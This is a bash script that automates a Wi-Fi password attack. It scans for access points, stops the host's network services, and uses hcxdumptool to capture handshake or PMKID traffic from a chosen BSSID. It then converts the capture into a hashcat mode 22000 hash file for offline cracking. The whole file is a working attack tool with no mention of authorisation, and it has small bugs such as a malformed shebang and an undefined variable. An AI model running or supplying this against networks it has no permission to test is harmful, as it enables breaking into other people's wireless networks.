#!bin/bash
# Run with root privileges.
wn_interface=${wn_interface:-wlan1}
target_bssid=${target_bssid:-"not_specified"}
output_folder=${output_folder:-.}

while [ $# -gt 0 ]; do

  if [[ $1 == *"--"* ]]; then
    param="${1/--/}"
    declare "$param"="$2"
    echo "$1" "$2"
  fi

  shift
done

echo -e "Following tools are required: \n - hcxdumptool v6.0.0 or higher \n - hcxpcapngtool from hcxtools v6.0.0 or higher\n - hashcat v6.0.0 or higher"

if [[ $target_bssid == "not_specified" ]]; then
  echo "Starting hashcat reacon scan on ${wn_interface_monitor}."

  xterm -title "hcxdumptool rcascan" -e hcxdumptool -i $wn_interface --do_rcascan &
  read -p "Type BSSID: " target_bssid

  killall xterm
fi

systemctl stop NetworkManager.service
sleep 2
systemctl stop wpa_supplicant.service
sleep 1

echo "Forwarding choosen AP's BSSID to configuration file."
echo $target_bssid >target_bssid.txt

hcxdumptool -i $wn_interface -o ${output_folder}/dumpfile.pcapng --active_beacon --enable_status=1 --filterlist_ap=target_bssid.txt --filtermode=2

echo "Bringing back wlan services..."
systemctl start wpa_supplicant.service
systemctl start NetworkManager.service
sleep 1

rm target_bssid.txt

echo "Converting the traffic to hash format 22000."
hcxpcapngtool -o ${output_folder}/hash.hc22000 ${output_folder}/dumpfile.pcapng

echo "done"
